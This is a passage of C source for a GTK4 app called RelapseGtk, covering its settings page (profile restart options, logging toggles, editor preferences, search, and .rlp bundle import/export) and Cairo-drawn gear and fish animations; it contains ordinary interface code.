        g_autoptr(GtkAlertDialog) alert = gtk_alert_dialog_new("Could not save Relapse settings");
        gtk_alert_dialog_set_detail(alert, error->message);
        gtk_alert_dialog_show(alert, GTK_WINDOW(gtk_widget_get_root(GTK_WIDGET(state->raknet))));
    }
}

void settings_set_raknet(GtkWidget *page, gboolean enabled)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    if (!state || state->stopped) return;
    state->updating = TRUE;
    gtk_switch_set_active(state->raknet, enabled);
    state->updating = FALSE;
}

static void restart_clicked(GtkButton *button, gpointer user_data)
{
    (void)button;
    Settings *state = user_data;
    if (state->restart_profiles)
        state->restart_profiles(state->user_data);
}

void settings_set_profiles_options(GtkWidget *page, const ProfilesSettings *options)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    state->updating = TRUE;
    gtk_spin_button_set_value(state->launch_delay,
        CLAMP(options->delay_ms, PROFILES_LAUNCH_DELAY_MIN, PROFILES_LAUNCH_DELAY_MAX));
    gtk_switch_set_active(state->auto_rejoin, options->auto_rejoin);
    gtk_editable_set_text(GTK_EDITABLE(state->rejoin_place), options->place_id ? options->place_id : "");
    gtk_editable_set_text(GTK_EDITABLE(state->rejoin_job), options->job_id ? options->job_id : "");
    gtk_spin_button_set_value(state->restart_minutes,
        CLAMP(options->restart_minutes, 0, PROFILES_RESTART_MINUTES_MAX));
    gtk_drop_down_set_selected(state->restart_mode,
        options->restart_mode == PROFILES_RESTART_SEQUENTIAL
            ? PROFILES_RESTART_SEQUENTIAL : PROFILES_RESTART_AT_ONCE);
    g_strfreev(state->excluded);
    state->excluded = g_strdupv((char **)options->excluded);
    if (!state->excluded)
        state->excluded = g_new0(char *, 1);
    state->updating = FALSE;
    update_exclude_summary(state);
}

void settings_set_profiles(GtkWidget *page, const char *const *names)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    if (state->stopped)
        return;
    if (state->profiles && names &&
        g_strv_equal((const char *const *)state->profiles, names))
        return;
    g_strfreev(state->profiles);
    state->profiles = g_strdupv((char **)names);
    update_exclude_summary(state);
}

void settings_check_updates(GtkWidget *page)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    if (!state->stopped && state->check_updates)
        state->check_updates(state->user_data);
}

void settings_shutdown(GtkWidget *page)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    state->stopped = TRUE;
    if (state->picker) g_cancellable_cancel(state->picker);
    if (state->bundle) g_cancellable_cancel(state->bundle);
}

static void free_settings(gpointer user_data)
{
    Settings *state = user_data;
    if (state->picker) g_cancellable_cancel(state->picker);
    g_clear_object(&state->picker);
    if (state->bundle) g_cancellable_cancel(state->bundle);
    g_clear_object(&state->bundle);
    if (state->exclude_dialog) {
        gtk_window_destroy(state->exclude_dialog);
        state->exclude_dialog = NULL;
        state->exclude_list = NULL;
    }
    g_strfreev(state->excluded);
    g_strfreev(state->profiles);
    g_free(state->scripts_path);
    g_free(state->image_path);
    g_free(state);
}

void settings_set_output(GtkWidget *page, gboolean enabled)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    state->updating = TRUE;
    gtk_switch_set_active(state->output, enabled);
    state->updating = FALSE;
}

static void output_changed(GObject *object, GParamSpec *property, gpointer user_data)
{
    (void)property;
    Settings *state = user_data;
    if (!state->updating && state->output_changed)
        state->output_changed(gtk_switch_get_active(GTK_SWITCH(object)), state->user_data);
}

static void single_log_changed(GObject *object, GParamSpec *property, gpointer user_data)
{
    (void)property;
    Settings *state = user_data;
    if (!state->updating && state->single_log_changed)
        state->single_log_changed(gtk_switch_get_active(GTK_SWITCH(object)), state->user_data);
}

void settings_set_single_log(GtkWidget *page, gboolean enabled)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    state->updating = TRUE;
    gtk_switch_set_active(state->single_log, enabled);
    state->updating = FALSE;
}

void settings_set_restore_tabs(GtkWidget *page, gboolean enabled)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    state->updating = TRUE;
    gtk_switch_set_active(state->restore_tabs, enabled);
    state->updating = FALSE;
}

static void restore_changed(GObject *object, GParamSpec *property, gpointer user_data)
{
    (void)property;
    Settings *state = user_data;
    if (!state->updating && state->restore_changed)
        state->restore_changed(gtk_switch_get_active(GTK_SWITCH(object)), state->user_data);
}

static void close_tabs_clicked(GtkButton *button, gpointer user_data)
{
    (void)button;
    Settings *state = user_data;
    if (state->close_tabs)
        state->close_tabs(state->user_data);
}

static void finish_bundle_pick(Settings *state)
{
    g_clear_object(&state->bundle);
    gtk_widget_set_sensitive(state->bundle_export, TRUE);
    gtk_widget_set_sensitive(state->bundle_import, TRUE);
}

static void bundle_export_finished(GObject *dialog, GAsyncResult *result, gpointer user_data)
{
    GWeakRef *owner = user_data;
    g_autoptr(GError) error = NULL;
    g_autoptr(GFile) file = gtk_file_dialog_save_finish(GTK_FILE_DIALOG(dialog), result, &error);
    g_autoptr(GtkWidget) page = g_weak_ref_get(owner);
    Settings *state = page ? g_object_get_data(G_OBJECT(page), "settings") : NULL;
    if (state && !state->stopped) {
        finish_bundle_pick(state);
        g_autofree char *target = NULL;
        if (file && !error) {
            g_autofree char *path = g_file_get_path(file);
            if (!path)
                g_set_error_literal(&error, G_IO_ERROR, G_IO_ERROR_INVALID_ARGUMENT,
                                    "Choose a local file.");
            else
                target = g_str_has_suffix(path, ".rlp") ? g_strdup(path)
                                                        : g_strconcat(path, ".rlp", NULL);
            if (target && portable_export(target, &error)) {
                g_autoptr(GtkAlertDialog) alert = gtk_alert_dialog_new("Bundle exported");
                g_autofree char *detail = g_strdup_printf("Settings, appearance and background saved to\n%s",
                                                          target);
                gtk_alert_dialog_set_detail(alert, detail);
                gtk_alert_dialog_show(alert, GTK_WINDOW(page));
            }
        }
        if (error)
            picker_error(page, "Could not export the bundle", error);
    }
    g_weak_ref_clear(owner);
    g_free(owner);
}

static GtkFileFilter *bundle_filter(void)
{
    GtkFileFilter *filter = gtk_file_filter_new();
    gtk_file_filter_set_name(filter, "RelapseGtk bundle (*.rlp)");
    gtk_file_filter_add_suffix(filter, "rlp");
    return filter;
}

static void bundle_export_clicked(GtkButton *button, gpointer user_data)
{
    (void)button;
    GtkWidget *page = user_data;
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    if (!state || state->stopped || state->bundle)
        return;
    GtkRoot *root = gtk_widget_get_root(page);
    if (!GTK_IS_WINDOW(root))
        return;
    state->bundle = g_cancellable_new();
    gtk_widget_set_sensitive(state->bundle_export, FALSE);
    gtk_widget_set_sensitive(state->bundle_import, FALSE);
    g_autoptr(GtkFileDialog) dialog = gtk_file_dialog_new();
    gtk_file_dialog_set_title(dialog, "Export config and appearance");
    gtk_file_dialog_set_accept_label(dialog, "Export");
    gtk_file_dialog_set_modal(dialog, TRUE);
    gtk_file_dialog_set_initial_name(dialog, "relapsegtk.rlp");
    g_autoptr(GFile) home = g_file_new_for_path(g_get_home_dir());
    gtk_file_dialog_set_initial_folder(dialog, home);
    g_autoptr(GListStore) filters = g_list_store_new(GTK_TYPE_FILE_FILTER);
    GtkFileFilter *filter = bundle_filter();
    g_list_store_append(filters, filter);
    gtk_file_dialog_set_filters(dialog, G_LIST_MODEL(filters));
    gtk_file_dialog_set_default_filter(dialog, filter);
    GWeakRef *owner = g_new0(GWeakRef, 1);
    g_weak_ref_init(owner, page);
    gtk_file_dialog_save(dialog, GTK_WINDOW(root), state->bundle, bundle_export_finished, owner);
}

static void bundle_import_finished(GObject *dialog, GAsyncResult *result, gpointer user_data)
{
    GWeakRef *owner = user_data;
    g_autoptr(GError) error = NULL;
    g_autoptr(GFile) file = gtk_file_dialog_open_finish(GTK_FILE_DIALOG(dialog), result, &error);
    g_autoptr(GtkWidget) page = g_weak_ref_get(owner);
    Settings *state = page ? g_object_get_data(G_OBJECT(page), "settings") : NULL;
    if (state && !state->stopped) {
        finish_bundle_pick(state);
        if (file && !error) {
            g_autofree char *path = g_file_get_path(file);
            if (!path)
                g_set_error_literal(&error, G_IO_ERROR, G_IO_ERROR_INVALID_ARGUMENT,
                                    "Choose a local file.");
            else if (portable_import(path, &error)) {
                if (state->reload_settings)
                    state->reload_settings(state->user_data);
                g_autoptr(GtkAlertDialog) alert = gtk_alert_dialog_new("Bundle imported");
                gtk_alert_dialog_set_detail(alert,
                    "Settings, appearance and background were applied.");
                gtk_alert_dialog_show(alert, GTK_WINDOW(page));
            }
        }
        if (error)
            picker_error(page, "Could not import the bundle", error);
    }
    g_weak_ref_clear(owner);
    g_free(owner);
}

static void bundle_import_clicked(GtkButton *button, gpointer user_data)
{
    (void)button;
    GtkWidget *page = user_data;
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    if (!state || state->stopped || state->bundle)
        return;
    GtkRoot *root = gtk_widget_get_root(page);
    if (!GTK_IS_WINDOW(root))
        return;
    state->bundle = g_cancellable_new();
    gtk_widget_set_sensitive(state->bundle_export, FALSE);
    gtk_widget_set_sensitive(state->bundle_import, FALSE);
    g_autoptr(GtkFileDialog) dialog = gtk_file_dialog_new();
    gtk_file_dialog_set_title(dialog, "Import config and appearance");
    gtk_file_dialog_set_accept_label(dialog, "Import");
    gtk_file_dialog_set_modal(dialog, TRUE);
    g_autoptr(GFile) home = g_file_new_for_path(g_get_home_dir());
    gtk_file_dialog_set_initial_folder(dialog, home);
    g_autoptr(GListStore) filters = g_list_store_new(GTK_TYPE_FILE_FILTER);
    GtkFileFilter *filter = bundle_filter();
    g_list_store_append(filters, filter);
    gtk_file_dialog_set_filters(dialog, G_LIST_MODEL(filters));
    gtk_file_dialog_set_default_filter(dialog, filter);
    GWeakRef *owner = g_new0(GWeakRef, 1);
    g_weak_ref_init(owner, page);
    gtk_file_dialog_open(dialog, GTK_WINDOW(root), state->bundle, bundle_import_finished, owner);
}

void settings_set_editor(GtkWidget *page, const EditorSettings *settings)
{
    Settings *state = g_object_get_data(G_OBJECT(page), "settings");
    state->updating = TRUE;
    gtk_spin_button_set_value(state->font_size, settings->font_size);
    gtk_switch_set_active(state->word_wrap, settings->word_wrap);
    gtk_switch_set_active(state->shift_close, settings->shift_close_skips_prompt);
    for (guint i = 0; i < G_N_ELEMENTS(indent_widths); ++i)
        if (settings->indent_width == indent_widths[i])
            gtk_toggle_button_set_active(state->indent[i], TRUE);
    state->updating = FALSE;
}

static void values_changed(GtkWidget *widget, gpointer user_data)
{
    Settings *state = user_data;
    if (state->updating || !state->changed ||
        (GTK_IS_TOGGLE_BUTTON(widget) && !gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(widget))))
        return;
    EditorSettings settings = {
        .font_size = gtk_spin_button_get_value_as_int(state->font_size),
        .word_wrap = gtk_switch_get_active(state->word_wrap),
        .indent_width = 4,
        .shift_close_skips_prompt = gtk_switch_get_active(state->shift_close)
    };
    for (guint i = 0; i < G_N_ELEMENTS(indent_widths); ++i)
        if (gtk_toggle_button_get_active(state->indent[i]))
            settings.indent_width = indent_widths[i];
    state->changed(&settings, state->user_data);
}

static void wrap_changed(GObject *object, GParamSpec *property, gpointer user_data)
{
    (void)property;
    values_changed(GTK_WIDGET(object), user_data);
}

static GtkWidget *label_new(const char *text, const char *style)
{
    GtkWidget *label = gtk_label_new(text);
    gtk_label_set_xalign(GTK_LABEL(label), 0);
    if (style)
        gtk_widget_add_css_class(label, style);
    return label;
}

static void set_row_search_text(GtkWidget *row, const char *title, const char *detail)
{
    g_autofree char *haystack = g_strdup_printf("%s %s", title, detail ? detail : "");
    g_object_set_data_full(G_OBJECT(row), "settings-search",
                           g_utf8_strdown(haystack, -1), g_free);
}

static GtkWidget *add_row(GtkWidget *group, const char *title, const char *description, GtkWidget *control)
{
    GtkWidget *row = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 20);
    gtk_widget_add_css_class(row, "settings-row");
    set_row_search_text(row, title, description);
    GtkWidget *labels = gtk_box_new(GTK_ORIENTATION_VERTICAL, 3);
    gtk_widget_set_hexpand(labels, TRUE);
    gtk_widget_set_valign(labels, GTK_ALIGN_CENTER);
    gtk_box_append(GTK_BOX(labels), label_new(title, "settings-label"));
    GtkWidget *detail = label_new(description, "settings-description");
    gtk_label_set_wrap(GTK_LABEL(detail), TRUE);
    gtk_label_set_max_width_chars(GTK_LABEL(detail), 33);
    gtk_box_append(GTK_BOX(labels), detail);
    gtk_box_append(GTK_BOX(row), labels);
    GtkWidget *slot = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);
    gtk_widget_set_size_request(slot, 132, -1);
    gtk_widget_set_valign(slot, GTK_ALIGN_CENTER);
    gtk_widget_set_hexpand(control, TRUE);
    gtk_widget_set_halign(control, GTK_ALIGN_END);
    gtk_box_append(GTK_BOX(slot), control);
    gtk_box_append(GTK_BOX(row), slot);
    gtk_box_append(GTK_BOX(group), row);
    return row;
}

static GtkWidget *section_new(GtkWidget *column, const char *title, GtkWidget **out_group)
{
    GtkWidget *section = gtk_box_new(GTK_ORIENTATION_VERTICAL, 8);
    gtk_widget_set_hexpand(section, TRUE);
    gtk_box_append(GTK_BOX(column), section);
    gtk_box_append(GTK_BOX(section), label_new(title, "settings-group-title"));
    GtkWidget *group = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);
    gtk_widget_add_css_class(group, "settings-group");
    gtk_widget_set_hexpand(group, TRUE);
    gtk_box_append(GTK_BOX(section), group);
    g_object_set_data(G_OBJECT(section), "settings-section-group", group);
    *out_group = group;
    return section;
}

static void settings_back_clicked(GtkButton *button, gpointer user_data)
{
    (void)button;
    gtk_stack_set_visible_child_name(GTK_STACK(user_data), "index");
}

static void settings_card_clicked(GtkButton *button, gpointer user_data)
{
    const char *name = g_object_get_data(G_OBJECT(button), "settings-page-name");
    if (name)
        gtk_stack_set_visible_child_name(GTK_STACK(user_data), name);
}

static GtkWidget *settings_page_scrolled(GtkWidget **out_content)
{
    GtkWidget *scroll = gtk_scrolled_window_new();
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scroll), GTK_POLICY_NEVER, GTK_POLICY_AUTOMATIC);
    GtkWidget *content = gtk_box_new(GTK_ORIENTATION_VERTICAL, 16);
    gtk_widget_add_css_class(content, "settings-page");
    gtk_scrolled_window_set_child(GTK_SCROLLED_WINDOW(scroll), content);
    *out_content = content;
    return scroll;
}

static GtkWidget *settings_page_header(GtkWidget *content, GtkWidget *stack, const char *title)
{
    GtkWidget *row = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 12);
    GtkWidget *back = gtk_button_new_with_label("< Settings");
    gtk_widget_add_css_class(back, "settings-back");
    gtk_widget_set_valign(back, GTK_ALIGN_CENTER);
    gtk_accessible_update_property(GTK_ACCESSIBLE(back),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Back to settings", -1);
    g_signal_connect(back, "clicked", G_CALLBACK(settings_back_clicked), stack);
    gtk_box_append(GTK_BOX(row), back);
    GtkWidget *heading = label_new(title, "settings-title");
    gtk_widget_set_valign(heading, GTK_ALIGN_CENTER);
    gtk_widget_set_hexpand(heading, TRUE);
    gtk_box_append(GTK_BOX(row), heading);
    gtk_box_append(GTK_BOX(content), row);
    return row;
}

static void settings_search_changed(GtkSearchEntry *entry, gpointer user_data)
{
    GtkWidget *content = user_data;
    GtkWidget *column = g_object_get_data(G_OBJECT(content), "settings-column");
    if (!column)
        return;
    g_autofree char *needle = g_utf8_strdown(gtk_editable_get_text(GTK_EDITABLE(entry)), -1);
    GHashTable *snapshot = g_object_get_data(G_OBJECT(content), "settings-search-snapshot");
    GtkWidget *empty = g_object_get_data(G_OBJECT(content), "settings-search-empty");

    if (!*needle) {
        if (snapshot) {
            GHashTableIter iter;
            gpointer row, value;
            g_hash_table_iter_init(&iter, snapshot);
            while (g_hash_table_iter_next(&iter, &row, &value))
                gtk_widget_set_visible(row, GPOINTER_TO_INT(value));
            g_object_set_data(G_OBJECT(content), "settings-search-snapshot", NULL);
        }
        for (GtkWidget *section = gtk_widget_get_first_child(column);
             section; section = gtk_widget_get_next_sibling(section))
            gtk_widget_set_visible(section, TRUE);
        if (empty)
            gtk_widget_set_visible(empty, FALSE);
        return;
    }

    if (!snapshot) {
        snapshot = g_hash_table_new(g_direct_hash, g_direct_equal);
        g_object_set_data_full(G_OBJECT(content), "settings-search-snapshot", snapshot,
                               (GDestroyNotify)g_hash_table_unref);
        for (GtkWidget *section = gtk_widget_get_first_child(column);
             section; section = gtk_widget_get_next_sibling(section)) {
            GtkWidget *group = g_object_get_data(G_OBJECT(section), "settings-section-group");
            if (!group)
                continue;
            for (GtkWidget *row = gtk_widget_get_first_child(group);
                 row; row = gtk_widget_get_next_sibling(row))
                g_hash_table_insert(snapshot, row,
                                    GINT_TO_POINTER(gtk_widget_get_visible(row)));
        }
    }

    gboolean any = FALSE;
    for (GtkWidget *section = gtk_widget_get_first_child(column);
         section; section = gtk_widget_get_next_sibling(section)) {
        GtkWidget *group = g_object_get_data(G_OBJECT(section), "settings-section-group");
        if (!group)
            continue;
        gboolean matched = FALSE;
        for (GtkWidget *row = gtk_widget_get_first_child(group);
             row; row = gtk_widget_get_next_sibling(row)) {
            const char *text = g_object_get_data(G_OBJECT(row), "settings-search");
            gboolean base = GPOINTER_TO_INT(g_hash_table_lookup(snapshot, row));
            gboolean visible = base && text && strstr(text, needle);
            gtk_widget_set_visible(row, visible);
            matched = matched || visible;
        }
        gtk_widget_set_visible(section, matched);
        any = any || matched;
    }
    if (empty)
        gtk_widget_set_visible(empty, !any);
}

static void settings_search_attach(GtkWidget *content, GtkWidget *column, GtkWidget *header)
{
    GtkWidget *search = gtk_search_entry_new();
    gtk_widget_add_css_class(search, "settings-search");
    gtk_widget_set_valign(search, GTK_ALIGN_CENTER);
    gtk_widget_set_size_request(search, 220, -1);
    gtk_accessible_update_property(GTK_ACCESSIBLE(search),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Search settings", -1);
    gtk_search_entry_set_placeholder_text(GTK_SEARCH_ENTRY(search), "Search settings");
    gtk_box_append(GTK_BOX(header), search);
    g_object_set_data(G_OBJECT(content), "settings-column", column);
    GtkWidget *empty = label_new("No settings match your search.", "settings-description");
    gtk_widget_set_visible(empty, FALSE);
    gtk_box_append(GTK_BOX(column), empty);
    g_object_set_data(G_OBJECT(content), "settings-search-empty", empty);
    g_signal_connect(search, "search-changed", G_CALLBACK(settings_search_changed), content);
}

typedef enum {
    GEAR_IDLE,
    GEAR_ACCEL,
    GEAR_CRUISE,
    GEAR_DECEL,
} GearPhase;

typedef struct {
    GtkWidget *area;
    GearPhase phase;
    double angle;
    double speed;
    double elapsed;
    double decel_from;
    gint64 last_us;
    guint tick_id;
    gboolean ticking;
} Gear;

#define GEAR_ACCEL_TIME 0.45
#define GEAR_DECEL_TIME 0.45
#define GEAR_TOP_SPEED 12.0

static double gear_ease(double x)
{
    if (x <= 0.0)
        return 0.0;
    if (x >= 1.0)
        return 1.0;
    double low = 0.0, high = 1.0, t = x;
    for (int i = 0; i < 24; ++i) {
        double mt = 1.0 - t;
        double px = 3.0 * mt * mt * t * 0.42 + 3.0 * mt * t * t * 0.58 + t * t * t;
        if (px < x)
            low = t;
        else
            high = t;
        t = (low + high) * 0.5;
    }
    double mt = 1.0 - t;
    return 3.0 * mt * t * t + t * t * t;
}

static double gear_ease_inverse(double value)
{
    if (value <= 0.0)
        return 0.0;
    if (value >= 1.0)
        return 1.0;
    double low = 0.0, high = 1.0, x = value;
    for (int i = 0; i < 24; ++i) {
        if (gear_ease(x) < value)
            low = x;
        else
            high = x;
        x = (low + high) * 0.5;
    }
    return x;
}

#define GEAR_PRESSURE_ANGLE (20.0 * G_PI / 180.0)

static double gear_involute(double radius, double base)
{
    if (radius <= base)
        return 0.0;
    double alpha = acos(CLAMP(base / radius, -1.0, 1.0));
    return tan(alpha) - alpha;
}

static void gear_shape(cairo_t *cr, double cx, double cy, int teeth, double pitch,
                       double phase, double line_width, const GdkRGBA *color)
{
    double module = 2.0 * pitch / teeth;
    double base = pitch * cos(GEAR_PRESSURE_ANGLE);
    double tip = pitch + module;
    double root = MAX(pitch - 1.3 * module, base + 0.05);
    double half = G_PI / (2.0 * teeth);
    double inv_pitch = tan(GEAR_PRESSURE_ANGLE) - GEAR_PRESSURE_ANGLE;
    double step = 2.0 * G_PI / teeth;
    double root_theta = half + inv_pitch - gear_involute(root, base);
    double tip_theta = half + inv_pitch - gear_involute(tip, base);
    const int samples = 8;

    cairo_save(cr);
    cairo_translate(cr, cx, cy);
    cairo_new_path(cr);

    for (int i = 0; i < teeth; ++i) {
        double center = phase + i * step;
        for (int s = 0; s <= samples; ++s) {
            double r = root + (tip - root) * (double)s / samples;
            double a = center + half + inv_pitch - gear_involute(r, base);
            if (i == 0 && s == 0)
                cairo_move_to(cr, cos(a) * r, sin(a) * r);
            else
                cairo_line_to(cr, cos(a) * r, sin(a) * r);
        }
        cairo_arc_negative(cr, 0, 0, tip,
                           center + tip_theta, center - tip_theta);
        for (int s = samples; s >= 0; --s) {
            double r = root + (tip - root) * (double)s / samples;
            double a = center - half - inv_pitch + gear_involute(r, base);
            cairo_line_to(cr, cos(a) * r, sin(a) * r);
        }
        cairo_arc(cr, 0, 0, root,
                  center - root_theta, center + step + root_theta);
    }
    cairo_close_path(cr);

    cairo_set_line_width(cr, line_width);
    cairo_set_line_join(cr, CAIRO_LINE_JOIN_ROUND);
    gdk_cairo_set_source_rgba(cr, color);
    cairo_stroke(cr);

    cairo_new_path(cr);
    cairo_arc(cr, 0, 0, pitch * 0.72, 0, 2.0 * G_PI);
    cairo_stroke(cr);

    cairo_new_path(cr);
    for (int i = 0; i < 3; ++i) {
        double a = phase + i * 2.0 * G_PI / 3.0;
        cairo_move_to(cr, cos(a) * pitch * 0.16, sin(a) * pitch * 0.16);
        cairo_line_to(cr, cos(a) * pitch * 0.72, sin(a) * pitch * 0.72);
    }
    cairo_stroke(cr);

    cairo_new_path(cr);
    cairo_arc(cr, 0, 0, pitch * 0.16, 0, 2.0 * G_PI);
    cairo_stroke(cr);
    cairo_restore(cr);
}

typedef struct {
    double x;
    double y;
    double pitch;
    double phase;
    int teeth;
    int depth;
} GearNode;

static int gear_teeth_for(int depth, int index)
{
    static const int level_one[] = {14, 18, 12, 16, 20, 14, 16, 12};
    static const int level_two[] = {10, 12, 14, 10, 16, 12, 14, 10, 12, 16, 10, 14, 12, 10, 16, 12};
    if (depth == 1)
        return level_one[index % G_N_ELEMENTS(level_one)];
    return level_two[index % G_N_ELEMENTS(level_two)];
}

static gboolean gear_overlaps(const GearNode *nodes, int count, int parent,
                              double x, double y, double pitch)
{
    for (int i = 0; i < count; ++i) {
        if (i == parent)
            continue;
        double dx = nodes[i].x - x;
        double dy = nodes[i].y - y;
        double limit = nodes[i].pitch + pitch - 0.5;
        if (dx * dx + dy * dy < limit * limit)
            return TRUE;
    }
    return FALSE;
}

static void gear_place(GearNode *nodes, int *count, int max, double module,
                       double x, double y, int teeth, double phase, int depth,
                       double outward, int parent, int *serial)
{
    if (*count >= max)
        return;
    double pitch = module * teeth / 2.0;
    if (parent >= 0 && gear_overlaps(nodes, *count, parent, x, y, pitch))
        return;
    int self = *count;
    nodes[self] = (GearNode){x, y, pitch, phase, teeth, depth};
    ++*count;
    if (depth >= 3)
        return;
    int children = depth == 0 ? 8 : (depth == 1 ? 3 : 2);
    double step = 2.0 * G_PI / teeth;
    for (int c = 0; c < children; ++c) {
        double desired = depth == 0 ? c * 2.0 * G_PI / children
                                    : outward + (c - (children - 1) * 0.5) * 0.8;
        double delta = phase + round((desired - phase) / step) * step;
        int child_teeth = gear_teeth_for(depth + 1, (*serial)++);
        double child_pitch = module * child_teeth / 2.0;
        double distance = module * teeth / 2.0 + child_pitch;
        gear_place(nodes, count, max, module,
                   x + cos(delta) * distance, y + sin(delta) * distance,
                   child_teeth, delta + G_PI - G_PI / child_teeth,
                   depth + 1, delta, self, serial);
    }
}

static void gear_draw(GtkDrawingArea *area, cairo_t *cr, int width, int height, gpointer user_data)
{
    (void)area;
    Gear *gear = user_data;
    double side = MIN(width, height);
    double module = side * 0.026;
    double line_width = MAX(0.9, side * 0.006);
    GdkRGBA color = {0.82, 0.84, 0.90, 0.17};
    GearNode nodes[64];
    int count = 0;
    int serial = 0;

    gear_place(nodes, &count, 64, module, width / 2.0, height / 2.0, 28, 0.0, 0, 0.0, -1, &serial);

    for (int i = 0; i < count; ++i) {
        double sign = (nodes[i].depth & 1) ? -1.0 : 1.0;
        double spin = sign * gear->angle * (28.0 / nodes[i].teeth);
        gear_shape(cr, nodes[i].x, nodes[i].y, nodes[i].teeth, nodes[i].pitch,
                   nodes[i].phase + spin, line_width, &color);
    }
}

static gboolean gear_tick(GtkWidget *widget, GdkFrameClock *clock, gpointer user_data)
{
    Gear *gear = user_data;
    if (style_animations_disabled()) {
        gear->ticking = FALSE;
        gear->last_us = 0;
        gear->phase = GEAR_IDLE;
        return G_SOURCE_REMOVE;
    }
    gint64 now = gdk_frame_clock_get_frame_time(clock);
    double dt = gear->last_us ? (now - gear->last_us) / 1000000.0 : 0.0;
    gear->last_us = now;
    dt = CLAMP(dt, 0.0, 0.1);

    switch (gear->phase) {
    case GEAR_ACCEL:
        gear->elapsed += dt;
        if (gear->elapsed >= GEAR_ACCEL_TIME) {
            gear->elapsed = GEAR_ACCEL_TIME;
            gear->speed = GEAR_TOP_SPEED * 0.4;
            gear->phase = GEAR_CRUISE;
        } else {
            gear->speed = GEAR_TOP_SPEED * gear_ease(gear->elapsed / GEAR_ACCEL_TIME);
        }
        break;
    case GEAR_CRUISE:
        gear->speed = GEAR_TOP_SPEED * 0.4;
        break;
    case GEAR_DECEL:
        gear->elapsed += dt;
        if (gear->elapsed >= GEAR_DECEL_TIME) {
            gear->speed = 0.0;
            gear->phase = GEAR_IDLE;
        } else {
            gear->speed = gear->decel_from * (1.0 - gear_ease(gear->elapsed / GEAR_DECEL_TIME));
        }
        break;
    case GEAR_IDLE:
    default:
        gear->speed = 0.0;
        break;
    }

    gear->angle += gear->speed * dt;
    gtk_widget_queue_draw(widget);

    if (gear->phase == GEAR_IDLE) {
        gear->ticking = FALSE;
        gear->last_us = 0;
        return G_SOURCE_REMOVE;
    }
    return G_SOURCE_CONTINUE;
}

static void gear_set_hovered(Gear *gear, gboolean hovered)
{
    if (!gear || style_animations_disabled())
        return;
    if (hovered) {
        if (gear->phase == GEAR_ACCEL || gear->phase == GEAR_CRUISE)
            return;
        double ratio = CLAMP(gear->speed / GEAR_TOP_SPEED, 0.0, 1.0);
        gear->elapsed = GEAR_ACCEL_TIME * gear_ease_inverse(ratio);
        gear->phase = GEAR_ACCEL;
        gear->last_us = 0;
    } else {
        if (gear->phase == GEAR_IDLE || gear->phase == GEAR_DECEL)
            return;
        gear->phase = GEAR_DECEL;
        gear->elapsed = 0.0;
        gear->decel_from = gear->speed;
    }
    if (!gear->ticking) {
        gear->ticking = TRUE;
        gear->tick_id = gtk_widget_add_tick_callback(gear->area, gear_tick, gear, NULL);
    }
}

static void gear_free(gpointer data)
{
    Gear *gear = data;
    if (gear->ticking) {
        gtk_widget_remove_tick_callback(gear->area, gear->tick_id);
        gear->ticking = FALSE;
    }
    g_free(gear);
}

typedef struct {
    GtkWidget *area;
    GearPhase state;
    double phase;
    double speed;
    double elapsed;
    double decel_from;
    double fish_phase;
    double fish_speed;
    double fish_decel_from;
    GdkPixbuf *fish_image;
    gint64 last_us;
    guint tick_id;
    gboolean ticking;
} Rainbow;

#define RAINBOW_TOP_SPEED 0.6
#define RAINBOW_CRUISE 0.4
#define FISH_CRUISE 0.6
#define FISH_IMAGE_PATH "/home/erikas/Pictures/fih.png"

static void rainbow_fish(cairo_t *cr, double x, double y, double length, double angle,
                         const GdkRGBA *color, const GdkRGBA *eye)
{
    double half = length * 0.5;
    double height = length * 0.19;
    cairo_save(cr);
    cairo_translate(cr, x, y);
    cairo_rotate(cr, angle);

    cairo_save(cr);
    cairo_scale(cr, 1.0, height / half);
    cairo_arc(cr, 0, 0, half, 0, 2.0 * G_PI);
    cairo_restore(cr);
    gdk_cairo_set_source_rgba(cr, color);
    cairo_fill(cr);

    cairo_move_to(cr, -half * 0.9, 0);
    cairo_line_to(cr, -half * 1.45, -height * 1.6);
    cairo_line_to(cr, -half * 1.45, height * 1.6);
    cairo_close_path(cr);
    cairo_fill(cr);

    gdk_cairo_set_source_rgba(cr, eye);
    cairo_arc(cr, half * 0.45, -height * 0.45, MAX(0.7, length * 0.055), 0, 2.0 * G_PI);
    cairo_fill(cr);
    cairo_restore(cr);
}

static GdkPixbuf *fish_image_trim(GdkPixbuf *image)
{
    int width = gdk_pixbuf_get_width(image);
    int height = gdk_pixbuf_get_height(image);
    int stride = gdk_pixbuf_get_rowstride(image);
    int channels = gdk_pixbuf_get_n_channels(image);
    gboolean alpha = gdk_pixbuf_get_has_alpha(image);
    guchar *pixels = gdk_pixbuf_get_pixels(image);
    int min_x = width, min_y = height, max_x = -1, max_y = -1;

    for (int y = 0; y < height; ++y) {
        guchar *row = pixels + y * stride;
        for (int x = 0; x < width; ++x) {
            guchar a = alpha ? row[x * channels + 3] : 255;
            if (a <= 8)
                continue;
            if (x < min_x) min_x = x;
            if (x > max_x) max_x = x;
            if (y < min_y) min_y = y;
            if (y > max_y) max_y = y;
        }
    }
    if (max_x < min_x || max_y < min_y)
        return NULL;
    return gdk_pixbuf_new_subpixbuf(image, min_x, min_y,
                                    max_x - min_x + 1, max_y - min_y + 1);
}

static void rainbow_fish_image(cairo_t *cr, GdkPixbuf *image, double x, double y,
                               double length, double angle)
{
    int w = gdk_pixbuf_get_width(image);
    int h = gdk_pixbuf_get_height(image);
    if (w <= 0 || h <= 0)
        return;
    double scale = length / w;
    cairo_save(cr);
    cairo_translate(cr, x, y);
